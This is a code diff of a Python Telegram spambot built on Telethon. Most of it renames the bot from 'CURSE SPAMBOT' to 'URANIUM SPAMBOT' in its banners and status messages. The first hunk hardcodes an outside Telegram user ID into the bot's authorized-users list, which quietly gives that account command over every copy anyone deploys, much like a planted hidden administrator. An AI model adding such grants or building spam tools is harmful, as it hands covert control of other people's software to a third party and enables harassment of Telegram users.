@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [5152972450]
 for x in SUDO: 
     SMEX_USERS.append(x)
     
@@ -1418,7 +1418,7 @@ async def ping(e):
 ██████╔╝██║░░██║██╔██╗██║██║░░██╗░
 ██╔═══╝░██║░░██║██║╚████║██║░░╚██╗
 ██║░░░░░╚█████╔╝██║░╚███║╚██████╔╝
-╚═╝░░░░░░╚════╝░╚═╝░░╚══╝░╚═════╝░\n\n\nCURSE SPAMBOT\n`{ms}` ᴍs")
+╚═╝░░░░░░╚════╝░╚═╝░░╚══╝░╚═════╝░\n\n\nURANIUM SPAMBOT\n`{ms}` ᴍs")
 
 
     
@@ -1528,7 +1528,7 @@ async def restart(e):
 @put.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
 async def alive(e):
     if e.sender_id in SMEX_USERS:
-        text = "  CURSE SPAMBOT \n\n\n YOUR BOT IS ALIVE !!\n\n ┏━━━━━━━━━━━━━━━━━\n ┣➣ ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ : 3.9.6\n ┣➣ ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ : 1.17 \n ┣➣ sᴜᴘᴘᴏʀᴛ : @SH4DOW_SUPPORT\n ┣➣ ᴄʀᴇᴀᴛᴇʀ : ALL\n ┗━━━━━━━━━━━━━━━━━━━\n "
+        text = " URANIUM SPAMBOT \n\n\n URANIUM BOT IS ALIVE !!\n\n ┏━━━━━━━━━━━━━━━━━\n ┣➣ ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ : 3.9.6\n ┣➣ ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ : 1.17 \n@URANIUM_FIGHTERS ┣➣ sᴜᴘᴘᴏʀᴛ :\n ┣➣ ᴄʀᴇᴀᴛᴇʀ : ALL\n ┗━━━━━━━━━━━━━━━━━━━\n "
         await e.reply(text, parse_mode=None, link_preview=None )
 
                         
@@ -1572,7 +1572,7 @@ OK"""
 
 print(text)
 print("")
-print("CONGRATS ! YOUR CURSE SPAMBOT HAS STARTED SUCCESSFULLY. TYPE .ping OR .alive TO CHECK IF YOUR BOT'S ALIVE STATUS.")
+print("CONGRATS ! YOUR URANIUM SPAMBOT HAS STARTED SUCCESSFULLY. TYPE .ping OR .alive TO CHECK IF YOUR BOT'S ALIVE STATUS.")
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect()
